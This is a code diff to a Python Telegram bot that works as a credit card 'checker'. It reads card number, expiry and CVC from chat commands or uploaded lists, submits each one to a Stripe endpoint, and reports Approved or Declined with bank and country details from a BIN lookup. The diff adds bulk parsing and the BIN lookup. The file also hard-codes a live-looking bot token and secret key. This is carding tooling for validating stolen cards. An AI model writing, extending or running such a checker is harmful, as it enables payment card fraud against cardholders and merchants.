@@ -2,17 +2,29 @@ import logging
 import os
 import threading
 from flask import Flask
-import telebot # aiogram ki jagah telebot
+import telebot 
 import requests
+import time
 
 # CONFIG
 API_TOKEN = '8744594607:AAGXRJnxQ_ylxbQO40sAQYigA5n1refYgY4'
 SECRET_KEY = "mk_1TogeC0PPaNM3lnKl6Bk78Ur"
-ANIMATION_URL = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif"
+ANIMATION_URL = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwZ3ZqZndwJmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9tYyG2cKc/giphy.gif"
 
 logging.basicConfig(level=logging.INFO)
 bot = telebot.TeleBot(API_TOKEN)
 app = Flask(__name__)
+
+# BIN LOOKUP - FIX FOR N/A
+def get_bin_info(cc):
+    try:
+        res = requests.get(f"https://lookup.binlist.net/{cc[:6]}").json()
+        return {
+            "bank": res.get("bank", {}).get("name", "N/A"),
+            "type": res.get("type", "N/A"),
+            "country": res.get("country", {}).get("name", "N/A")
+        }
+    except: return {"bank": "N/A", "type": "N/A", "country": "N/A"}
 
 # FORMATTING DESIGN
 def get_format(cc, status, gate, bin_info, user_name):
@@ -38,24 +50,31 @@ def check_cc(cc, mm, yy, cvc):
     data = {"card[number]": cc, "card[exp_month]": mm, "card[exp_year]": yy, "card[cvc]": cvc}
     try:
         res = requests.post(url, headers=headers, data=data).json()
-        if "error" in res: return "Declined", {"bank": "N/A", "type": "N/A", "country": "N/A"}
-        return "Approved", {"bank": "Green Dot Bank", "type": "Visa - Debit", "country": "United States"}
-    except: return "Declined", {}
+        bin_info = get_bin_info(cc)
+        if "error" in res: return "Declined", bin_info
+        return "Approved", bin_info
+    except: return "Declined", get_bin_info(cc)
 
 # COMMANDS
 @bot.message_handler(commands=['start'])
 def start(message):
     loading = bot.send_animation(message.chat.id, animation=ANIMATION_URL)
     bot.delete_message(message.chat.id, message.message_id)
-    # telebot mein simple sleep use hota hai
-    import time
     time.sleep(2.5)
     bot.delete_message(message.chat.id, loading.message_id)
-    bot.send_message(message.chat.id, "✅ Kushal Bot Ready! Commands menu dekhein.")
+    bot.send_message(message.chat.id, "✅ Kushal Bot Ready! Commands: /chk cc|mm|yy|cvc aur /st")
 
 @bot.message_handler(commands=['chk'])
 def chk(message):
-    bot.reply_to(message, "CC bhejein: `cc|mm|yy|cvc`", parse_mode="Markdown")
+    try:
+        # Command se data nikalna
+        input_data = message.text.split(' ', 1)[1]
+        parts = input_data.replace('|', ':').split(':')
+        status, bin_info = check_cc(parts[0], parts[1], parts[2], parts[3])
+        msg = get_format(parts[0], status, "Stripe", bin_info, message.from_user.username or "User")
+        bot.reply_to(message, msg, parse_mode="HTML")
+    except:
+        bot.reply_to(message, "Format galat hai! Use: `/chk cc|mm|yy|cvc`", parse_mode="Markdown")
 
 @bot.message_handler(commands=['st'])
 def st(message):
@@ -70,7 +89,7 @@ def handle_docs(message):
     
     for line in lines:
         try:
-            parts = line.replace('|', ':').split(':')
+            parts = line.replace('|', ':').replace(';', ':').split(':')
             status, bin_info = check_cc(parts[0], parts[1], parts[2], parts[3])
             msg = get_format(parts[0], status, "Stripe", bin_info, message.from_user.username or "User")
             bot.reply_to(message, msg, parse_mode="HTML")
@@ -81,7 +100,5 @@ def handle_docs(message):
 def home(): return "Bot is running!"
 
 if __name__ == '__main__':
-    # Flask thread
     threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))), daemon=True).start()
-    # Telebot polling
     bot.infinity_polling()
